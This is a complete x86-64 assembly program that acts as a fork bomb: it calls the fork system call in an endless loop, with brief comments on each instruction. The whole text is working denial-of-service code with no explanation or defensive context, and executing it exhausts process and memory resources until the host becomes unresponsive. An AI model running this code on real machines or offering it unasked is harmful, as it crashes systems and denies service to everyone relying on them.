[SECTION .text]
global _start
_start:
        xor rax, rax ;zero-out rax register
        mov al, 57 ;fork() is sys call 57
        syscall
        jmp short _start ;endless loop
